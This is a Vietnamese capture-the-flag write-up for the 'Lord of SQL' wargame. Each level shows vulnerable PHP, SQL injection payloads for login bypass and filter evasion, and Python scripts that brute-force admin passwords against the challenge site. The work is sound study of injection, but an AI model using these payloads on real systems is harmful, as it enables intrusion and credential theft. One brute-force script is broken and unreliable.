# LORD OF SQL

## GREMLIN

```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

payload: `id=cc&pw='or 1=1 -- -`

## COBOLT

```php
http://www.wechall.net
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

payload: `id=admin' -- -`

## GOBLIN

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>

```

Bởi vì no=int nên ta có thể không cần '&#x20;

payload :  no=1 or id= ????

Ở đây không xài được admin thông thường mà ta sẽ hex(admin) = 0x61646D696E

Payload: `no=1 or id= 0x61646D696E`

## ORC

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

Đọc code ta thấy Hàm **addslashes()** dùng để thêm một dấu gạch chéo ngược (\\) phía trước các ký tự là dấu nháy kép, dấu nháy đơn và dấu gạch chéo ngược trong chuỗi.

Để sovle được câu này ta phải có password của admin vì vậy cách làm sẽ là brute force pw

Đầu tiên ta sẽ dùng burp kiểm tra độ dài của pass `?pw=' or 1=1 and length(pw)=?`&#x20;

![](<.gitbook/assets/image (1) (1).png>)

Ta thấy lúc này pw có độ dài là 9. Viết payload

```python
import requests
import string
# len pw = 9
url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
char = string.printable
cookie = {'Cookie':'PHPSESSID=7ih6g2u8u6tdme1u61etcjhgb7'}
password =''
session = requests.session()
for i in range(1,10):
    for j in char:
        pass_1 = password + j
        print(pass_1)
        param = "pw= 'or 1=1 and substring(pw,1,{}) = '{}'-- -".format(i,pass_1)
        r = session.get(url , params = param , headers = cookie)
        if ('Hello admin' in r.text):
            password = password + j
            print(password)
            break
#095a9852#
```

## WOLFMAN

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

Câu này filter whitespace vì vậy ta bypass bằng `/**/, %0a, %09, %0d, (), +`&#x20;

`payload = 1%27%0dor%0did=%27admin%27--%0d-`

## DARKELF

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

#### filter: or and \_ . ()

\=> Thay or = ||

`payload = '1|| id = 'admin' -- -`

## ORGE

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>php
```

Tương tự như DARKELF với ORC ta có solved.py

```python
import requests
import string
# len pw = 9
url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
char = string.printable
cookie = {'Cookie':'PHPSESSID=7ih6g2u8u6tdme1u61etcjhgb7'}
password =''
session = requests.session()
for i in range(1,9):
    for j in char:
        pass_1 = password + j
        print(pass_1)
        param = "".format(i,pass_1)
        r = session.get(url , params = param , headers = cookie)
        if ('Hello admin' in r.text):
            password = password + j
            print(password)
            break
#7b751aec
```

## TROLL&#x20;

```php
<?php  
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match("/admin/", $_GET[id])) exit("HeHe");
  $query = "select id from prob_troll where id='{$_GET[id]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id'] == 'admin') solve("troll");
  highlight_file(__FILE__);
?>
```

Filter: admin '

Cái này chỉ filter chữ admin nên ta có thể viết hoa

payload = AdMin

## VAMPIRE

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
  $_GET[id] = strtolower($_GET[id]);
  $_GET[id] = str_replace("admin","",$_GET[id]); 
  $query = "select id from prob_vampire where id='{$_GET[id]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("vampire"); 
  highlight_file(__FILE__); 
?>php
```

Câu này giống câu trên khác mỗi nó sẽ lowcase chữ admin rồi thay admin = "" nên payload sẽ là `AdadminMin`

## SKELETON

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```

Filter: \_ . ()

Câu này chỉ cần id=admin là được&#x20;

`payload = ' or id = 'admin' -- -`

## GOLEM

```php
http://www.wechall.net
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```

filter: `_ . () or and substr =`

Tiếp tục là brute force password thôi ta sẽ làm như các câu bf trên nhưng ta thay '=' thành 'like' còn 'substring' = 'left' nên ta sẽ có payload như sau

```python
import requests
import string
# len pw = 9
url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
char = string.printable
cookie = {'Cookie':'PHPSESSID=7ih6g2u8u6tdme1u61etcjhgb7'}
password =''
session = requests.session()
for i in range(1,20):
    for j in char:
        pass_1 = password + j
        print(pass_1)
        param = "pw= 1'|| true %26%26 left(pw,{}) like '{}'-- -".format(i,pass_1)
        r = session.get(url , params = param , headers = cookie)
        if ('Hello admin' in r.text):
            password = password + j
            print(password)
            break
#77d6290b
```

## DARKKNIGHT

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```

filter: pw `'` &#x20;

no  `_ . () substr ascii =`

Câu này cũng brute force như các câu trên thay vì viết script ở pw thì lần này viết ở no mà no là int nên ta sẽ có payload kiểu như sau `no = 1|| 1 like 1` và `admin` sẽ phải đổi thành `hex` vì asscii bị filter , `substr` thành `left` , dấu `=` thành `like` => ta có payload như sau

```python
import requests
import string
url = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
char = string.printable
cookie = {'Cookie':'PHPSESSID=7ih6g2u8u6tdme1u61etcjhgb7'}
password =''
session = requests.session()
for i in range(1,20):
    for j in char:
        pass_1 = password + j
        print(pass_1)
        param = 'pw= 1&no= 1 || 1 like 1 %26%26 id like 0x61646d696e %26%26 left(pw,{}) like "{}"-- -'.format(i,pass_1)
        r = session.get(url , params = param , headers = cookie)
        if ('Hello admin' in r.text):
            password = password + j
            print(password)
            break
#0b70ea1f
```

## BUGBEAR

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```

```python
import requests
import string

char = string.printable
url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
header = {'Cookie':'PHPSESSID=1k033ilrvrlrsps5aktrqc28hq'}
session = requests.Session()
pw = ''

for i in range(1,16):
    for c in char: 
        temp = pw + c
        param = f'pw=1&no=1||true%26%26id%09in("admin")%26%26left(pw,{i})%09IN("{temp}")--%09-'
        print(param)
        r = session.get(url = url , params = param , headers = header )
        if "Hello admin" in r.text:
            pw += c
            print(pw)
            break

```

## GIANT (space filter)

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(strlen($_GET[shit])>1) exit("No Hack ~_~"); 
  if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe"); 
  $query = "select 1234 from{$_GET[shit]}prob_giant where 1"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result[1234]) solve("giant"); 
  highlight_file(__FILE__); 
?>
```

Chúng ta có một số kí tự để thay thế khoảng trắng như: `%20`-> `` , `%0a`->, `%0d`->, `%09`-> nhưng hầu hết mấy kí tự này đều bị filter nhưng chúng ta có thể sử dụng `%0b` hoặc `%0c` để thay thế khoảng trắng&#x20;

\=> /?shit=%0b

## Assassin

```parigp
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>hp
```

![](<.gitbook/assets/image (1).png>)

Bài này sẽ bypass like dùng `a%` brute force password

```python
import requests
import string

char = string.printable
url="https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php/"
header = {'Cookie':'PHPSESSID=1k033ilrvrlrsps5aktrqc28hq'}
session = requests.Session()
pw = ""
for j in range(0,256):
    for i in char:
        pw += i
        print(pw)
        r = session.get(url=url , headers=header , params={"pw" : f"{pw}%"})
        if "Hello guest" in r.text:
            print(pw)
        else:
            pw = pw.replace(i , "")  
        if "Hello admin" in r.text:
            print("flag : " , pw)
            break

```

## SUCCUBUS

```php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/\'/',$_GET[id])) exit("HeHe");
  if(preg_match('/\'/',$_GET[pw])) exit("HeHe");
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
```

Phân tích code: Chương trình có 2 tham số để chúng ta input vào đó là `id` và `pw` và đều được filter kí tự `'`. Nếu có `id` có kết quả trả về thì sẽ giải quyết được bài này. Quan trọng ở đây là chương trình đã filter kí tự `'` vì vậy chúng ta không thể thoát id hoặc pw nhưng có một cách để biến query từ id tới and pw thành một chuỗi đó là cách `chuỗi trích dẫn đơn` bằng cách sử dụng kí tự `\`

payload : id=\\\&pw=or%201=1%20--%20-

## ZOMBIE\_ASSASSIN

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();
  $_GET['id'] = strrev(addslashes($_GET['id']));
  $_GET['pw'] = strrev(addslashes($_GET['pw']));
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("zombie_assassin"); 
  highlight_file(__FILE__); 
?>
```



* Phân tích code: chương trình có 2 tham số để chúng ta input vào là `id` và `pw`. Hàm `strrev` có tác dụng đảo ngược các kí tự trong đầu vào của chúng ta còn hàm `addslashes` để filter các kí tự `', ", \, NUll` nếu có các kí tự đó trong đầu vào thì sẽ thêm kí tự `\` vào phía trước.
* Ở bài này giống như bài trước chúng ta có thể sử dụng `chuỗi trích dẫn đơn` để thêm query vào query gốc nhưng ở bài này nếu ở id nhập vào là `\` thì id tự động chuyển thành `\\` vì có hàm `addslashes`. Nhưng nếu chúng ta nhập vào null là `%00` thì id sẽ thành `0\` như vậy nó đã thành chuỗi trích dẫn đơn và chúng ta có thể thêm query mới vào.

\=> payload: id=%00\&pw= -- - 1 = 1 ro&#x20;

## NIGHTMARE \<NULL>

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

filter : \`prob \_ . () # -\` and len(pw) <= 6

payload: pw=')=0;%00

%00 để vô hiệu hoá query đằng sau

## XAVIS \<Hex brute force>

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>php
```

Filter :`prob _ . (\) regex like`

idea : Brute force => Hello admin

Bài này bf string thì không đc nên ta sẽ dùng hex rồi decode ra lại pw

```python
import requests
import string

char = string.printable
url="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php/"
header = {'Cookie':'PHPSESSID=1k033ilrvrlrsps5aktrqc28hq'}
session = requests.Session()
flag = ""
for j in range(1,25):
    print(j , "======================================================")
    for i in char:
        r = session.get(url = url , headers = header , params = {"pw" : f"' or 1=1 and substr(hex(pw), {j} , 1 ) = '{i}"})
        print(i , " ", len(r.text))
        if "Hello admin" in r.text:
            flag += i
            print("flag : " , flag)
            break
```

\=> pw = 0000c6b00000c6550000ad73 => decrypt = 우왕굳

## Dragon

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("dragon");
  highlight_file(__FILE__); 
?>
```

Dấu `#` ở bài này là comment đoạn query nên ta sẽ không nhập được password để bypass câu này thì ta chỉ cần xuống dòng mà xuống dòng trong urlencode là `%0a` nên ta sẽ có đoạn payload

\=>payload : /?pw='%0a and pw='j1s0o' or id = 'admin' -- -

## Iron\_golem(error based)

```php
<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit(mysqli_error($db));
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```

payload = ' or if(ord(substr({pw},{i},1))={j},( select 1 union select 2),1)-- -

## Dark\_eyes (error based)

```php
<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
```

payload = 'or id = 'admin' and (select 1 union select ord(substr({pw},{i},1))={j})-- -

## Hell\_FIre(order by)

```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|proc|union/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}";
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysqli_query($db,$query);
  while(($result = mysqli_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("hell_fire");
  highlight_file(__FILE__);
?>
```

payload = if(id = "admin" and substr({pw},{i},1)="{j}", (select {col1}) , (select {col2}))

